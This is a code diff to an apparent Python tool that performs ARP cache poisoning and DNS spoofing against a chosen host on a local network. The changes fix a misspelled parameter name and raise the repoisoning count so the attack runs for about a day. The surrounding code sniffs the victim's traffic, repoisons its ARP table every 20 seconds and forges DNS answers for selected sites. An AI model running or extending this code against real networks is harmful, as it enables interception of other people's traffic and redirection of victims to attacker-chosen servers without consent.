@@ -23,14 +23,15 @@ regex = re.compile(
 
 ### CONSTANTS ###
 
-END_POISON = int(200) # number of packets sent during repoisoning
+# 4320 * 20 seconds = 1 day
+END_POISON = int(4320) # number of packets sent during repoisoning
 REPOISON_TIME = int(20) # interval of repoisoning
 
 
 ### FUNCTIONS ###
 
 # Main function that runs the DNS attack
-def dns_spoofing(gratuitious):
+def dns_spoofing(gratuitous):
     # clear terminal and begin keeping track of previous displayed text for UI
     spoof.clear()
     previous_tuples = []
@@ -108,7 +109,7 @@ def dns_spoofing(gratuitious):
     spoof.printf("Poisoning initiated.", 4)
 
     # run the main function for dns spoofing
-    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)
+    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitous, END_POISON)
 
     # end ARP poisoning by unpoisoning the tables of all targets with the correct mac addresses of gateways
     for gw_ip, gw_mac in gateways.items():
@@ -223,8 +224,8 @@ def is_IP_valid(active_hosts, ip_address):
 # Function for dns spoofing the connection between the target and the chosen urls
 #
 # @param dns_hosts  dictionary containing tuples for websites to spoof and with which ip
-# @param gratuitious whether the ARP poisoning should be silent (False) or all-out (True)
-def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
+# @param gratuitous whether the ARP poisoning should be silent (False) or all-out (True)
+def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitous, end_poison):
         # filter for sniffing only packets that are from/to the target
         _filter = "host " + target["ip"]
 
@@ -238,16 +239,16 @@ def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gra
             sniff(prn=process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2), filter=_filter, store=0, timeout=REPOISON_TIME)   
             
             # {REPOISON_TIME} seconds have passed => should repoison
-            repoison(my_addresses, gateways, target, iface, gratuitious)
+            repoison(my_addresses, gateways, target, iface, gratuitous)
 
         # close the socket at the end of the procedure
         s2.close()
 
 # Function for repoisong the arp table of the target for each gateway
-def repoison(my_addresses, gateways, target, iface, gratuitious):
+def repoison(my_addresses, gateways, target, iface, gratuitous):
     spoof.printf("Repoisoning", 4)
     for gw_ip, gw_mac in gateways.items():
-        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
+        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitous)
 
 # Function for proccessing sniffed packets
 #
